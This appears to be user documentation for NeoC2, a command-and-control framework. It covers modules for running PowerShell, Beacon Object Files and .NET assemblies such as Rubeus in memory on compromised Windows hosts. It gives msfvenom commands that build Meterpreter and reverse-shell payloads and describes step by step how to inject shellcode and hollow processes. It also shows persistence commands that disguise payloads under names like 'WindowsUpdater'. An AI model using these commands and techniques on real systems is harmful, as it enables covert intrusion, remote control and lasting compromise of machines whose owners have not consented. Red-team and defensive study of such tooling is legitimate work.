# Specialized Modules

## Multi-Operator Extension Module System

### Overview

The NeoC2 framework implements a sophisticated client-server compartmentalization system that allows multiple operators to use their own local extension modules without interfering with each other. This system ensures that each operator can maintain their own set of custom tools and payloads while maintaining security and operational separation.

### Client-Server Compartmentalization

#### Local File Discovery Process

When an operator executes a command like `execute-bof whoami.x64.o`, the system follows this process:

1. **Client-Side File Search**: The remote client searches for the file in the operator's own local machine and remote client environment:
   - `cli/extensions/bof` directory
   - `cli/extensions/` directory
   - Current working directory
   - Subdirectories specific to the module type (assemblies, powershell, pe, etc.)

2. **Base64 Encoding**: If the file is found locally, it is read an forwards it to the server

4. **Server-Side Processing**: The server receives the content and forwards it to the agent without needing to search for the file locally


### Multi-Operator Support

#### Isolated Extension Spaces

Each operator maintains their own local extension modules:

- **Operator A** can have `cli/extensions/bof/steal-token.o` in their local directory
- **Operator B** can have `cli/extensions/bof/dump-creds.o` in their local directory
- Both operators can use their respective modules without interference

### Supported Module Types

#### Beacon Object Files (BOFs)
- **Search Directories**: `cli/extensions/bof/`, `cli/extensions/`
- **File Extensions**: `.o`, `.bof`, `.x64.o`, `.x86.o`

#### .NET Assemblies
- **Search Directories**: `cli/extensions/assemblies/`, `cli/extensions/`
- **File Extensions**: `.exe`, `.dll`

#### PE Injection
- **Search Directories**: `cli/extensions/`, `cli/extensions/pe/`
- **File Extensions**: `.exe`, `.dll`

#### PowerShell Scripts
- **Search Directories**: `cli/extensions/powershell/`, `cli/extensions/`
- **File Extensions**: `.ps1`, `.psm1`, `.psd1`

#### Shellcode PInject
- **Search Directories**: `cli/extensions/`, `cli/extensions/shellcode/`
- **File Extensions**: `.b64`,

### Security and Isolation Benefits

#### Operational Security
- Each operator's extensions remain local to their client
- No need to upload sensitive tools to the server
- Reduced server storage requirements
- Enhanced operational security through local storage

#### Multi-Operator Isolation
- Operators cannot access each other's local modules
- Each operator maintains their own toolset
- No cross-contamination between operator environments
- Individual accountability for tools used

## Powershell

This `pwsh` module helps operators run their own extendible powershell scripts on a target's Windows machine via an active agent session

### Compatibility:
- Go_agent
- Phantom Hawk agent
- Windows x64

### Basic Usage:

```
modules info pwsh
pwsh <script_path> [agent_id=<agent_id>] [arguments=<script_arguments>]
# Examples:
pwsh my_script.ps1
pwsh my_script.ps1 agent_id=abc123-4567-8901-2345-67890abcdef1
pwsh my_script.ps1 arguments="-param1 value1 -param2 value2"
```

## Execute-BOF

This module interfaces with an agent and enables pure in-memory execution of Beacon Object Files (BOFs) without any disk writes. The solution leverages the goffloader library to execute BOFs directly in the agent's memory space.

#### Compatibility
- Go_agent
- Windows x64

#### Usage
1. Place BOFs in the `modules/external/` or `modules/external/bof/` directories on the C2 Server
2. Use the module with a BOF filename (path will be resolved automatically)
3. The agent will in-memory execute the BOF using its COFFloader library
4. BOF results are captured and sent back through C2 channel to operator
5. No files written to disk at any stage; complete execution in agent's memory space

### Command syntax
Execute BOFs using the execute-bof command:

```
modules info execute-bof
# In interactive mode, the agent ID is automatically inferred:
execute-bof <bof_filename> [arguments]
# Examples:
execute-bof whoami.x64.o
execute-bof whoami.x64.o -h
```

## Execute-Assembly

This module interfaces with an agent and enables in-memory execution of .NET assemblies without any disk writes. The solution leverages the go-clr library to execute .NET assemblies directly in the agent's memory space, supporting both .NET executables (.exe) and libraries (.dll).

#### Compatibility
- Go_agent
- Windows x64

#### Usage
1. Place .NET assemblies in the `modules/external/` or `modules/external/assemblies/` directories on the C2 Server
2. Use the module with an assembly filename (path will be resolved automatically)
3. The agent will load the CLR runtime and execute the assembly in-memory
4. Assembly output is captured and sent back through the C2 channel to the operator
5. No files written to disk at any stage; complete execution in agent's memory space

### Command syntax
Execute .NET assemblies using the execute-assembly command:

```
modules info execute-assembly
# In interactive mode, the agent ID is automatically inferred:
execute-assembly <assembly_filename> [agent_id=<agent_id>]
# Examples:
execute-assembly Rubeus.exe
execute-assembly SharpHound.exe agent_id=abc123-4567-8901-2345-67890abcdef1
```

### Key Features:
- Supports .NET Framework v4 and above
- Captures stdout/stderr output from executed assemblies
- Handles both .NET executables and libraries
- Direct in-memory execution without file system access
- Compatible with tools like Rubeus, SharpHound, and other .NET utilities
- Supports both positional arguments and named parameters (e.g., `execute-assembly Rubeus.exe` or `execute-assembly assembly_path=Rubeus.exe`)

## PInject

This module interfaces with an active agent for In-memory shellcode injection into a sacrificial process using CreateRemoteThread

#### Compatibility
- Go_agent
- Windows x64

#### Usage
1. Generate compatible shellcode using msfvenom
2. Run the module and send shellcode as a base64 encoded string or a .b64 file
3. The agent will in-memory inject the shellcode into either notepad.exe or explorer.exe

#### msfvenom Command Syntax
Generate shellcode with proper null byte avoidance and correct format:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f raw -o shellcode.bin

# Base64 encode the raw shellcode and save to .b64 file before sending to the module - (preferred METHOD 1)
base64 -w 0 shellcode.bin > shellcode.b64 
pinject shellcode.b64

# Base64 encode the raw shellcode before sending to the module - METHOD 2
base64 -w 0 shellcode.bin
pinject <base64_shellcode>
# Example:
pinject 123ABCD==
```

#### Notes
- If notepad.exe is not running on the target system, the agent will fallback on explorer.exe
- The shellcode must be in raw binary format (use `-f raw`)

#### Shellcode Injection Flow
1. Find target process PID
2. Open process with appropriate permissions
3. Allocate memory in target process
4. Write shellcode to allocated memory
5. Change memory protection to executable
6. Create remote thread to execute shellcode
7. All operations performed in-memory without touching disk

#### Supported Payloads
- windows/x64/meterpreter/reverse_tcp
- windows/x64/shell_reverse_tcp
- windows/x64/exec
- Any custom raw shellcode


## PEInject

This module interfaces with an agent and enables In-memory Injection of an unmanaged PE(Portable Executable) using Process Hollowing into a sacrificial process

#### Compatibility
- Go_agent
- Windows x64

#### Usage
1. Generate compatible PE payload using msfvenom
2. Place the PE file in the `cli/extensions/` directory 
3. Parse the `pe_file` name (path will be resolved automatically) as a required argument of the peinject module
4. The agent will in-memory inject this into either svchost.exe or explorer.exe using Process Hollowing

#### msfvenom Command Syntax

```
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe

peinject pe_file=<payload_filename> # METHOD - 1 (Interactive mode) - File will be resolved automatically
run peinject pe_file=<payload_filename> [agent_id=<agent_id>] # METHOD - 2 (Non-interactive mode)

# Examples:

peinject payload.exe
peinject payload.exe agent_id=abc123-4567-8901-2345-67890abcdef1

peinject pe_file=payload.exe
peinject pe_file=payload.exe agent_id=abc123-4567-8901-2345-67890abcdef1
```

#### PE Injection Flow
1. Parses and validates the DOS header and NT headers to ensure the file is a valid PE
2. Creates a Windows process (svchost.exe or explorer.exe) in suspended state
3. Unmap the target process memory using the undocumented NtUnmapViewOfSection API
4. Allocates executable memory in the target process with proper permission
5. Writes the entire PE file contents to the allocated memory in the target process using WriteProcessMemory
6. Retrieves the suspended thread context and updates the instruction pointer to point to the new PE's entry point
7. Sets the modified thread context back to the suspended thread
8. Resumes the target process thread using ResumeThread, which begins execution of the injected PE

#### Supported Payloads
- windows/x64/exec
- windows/x64/shell_reverse_tcp
- windows/x64/meterpreter/reverse_tcp

## Persist

This module helps operators establishes persistence on systems using various techniques `modules info persistence`

### Compatibility:
- Go_agent
- Phantom Hawk agent
- Windows x64
- Linux debian
- MacOS

#### Required Options:
- `agent_id`: ID of the agent to establish persistence on
- `method`: Persistence method (registry, startup, cron, launchd, systemd, or service)
- `payload_path`: Path to the payload/script to persist

#### Optional Options:
- `name`: Name for the persistence mechanism (default: "SystemUpdate")
- `interval`: Interval for scheduled tasks (minutes, only for cron/systemd) (default: "60")

#### Usage:

```
# In interactive mode, the agent ID is automatically inferred:
persist <method> <payload_path> [agent_id=<agent_id>] [name=<persistence_name>] [interval=<minutes>]

# Linux/macOS Cron Persistence:
persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=cron payload_path=/tmp/payload.sh

# Windows Registry Persistence:
persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=registry payload_path=C:\Users\Public\payload.exe

# Windows Startup Folder:
persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=startup payload_path=C:\Users\Public\payload.exe

# Windows Service:
persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=service payload_path=C:\Users\Public\payload.exe name=WindowsUpdater

Linux Systemd Service:
persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=systemd payload_path=/opt/payload service_interval=30

macOS LaunchAgent:
persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=launchd payload_path=/Applications/payload.sh
```
